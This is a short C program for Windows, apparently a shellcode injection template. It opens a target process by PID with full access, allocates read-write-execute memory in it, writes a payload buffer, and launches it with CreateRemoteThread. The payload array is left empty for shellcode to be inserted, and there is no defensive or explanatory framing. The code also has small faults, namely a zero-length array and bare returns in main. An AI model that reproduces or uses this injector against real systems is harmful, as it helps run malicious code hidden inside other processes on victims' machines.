#include <stdio.h>
#include <Windows.h>

int main(int argc, char* argv[]) {

	unsigned char data[0] = {};

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	printf("Injecting to PID: %i\r", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)((atoi(argv[1]))));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof data, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	int result = WriteProcessMemory(processHandle, remoteBuffer, data, sizeof data, NULL);
	
	if (result == 0) {
		printf("Error while WriteProcessMemory. ErrorCode = %i\r", GetLastError());
		return;
	}
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	
	if (remoteThread == NULL) {
		printf("Error while CreateRemoteThread. ErrorCode = %i\r", GetLastError());
		return;
	}

	CloseHandle(processHandle);

	return 0;
}
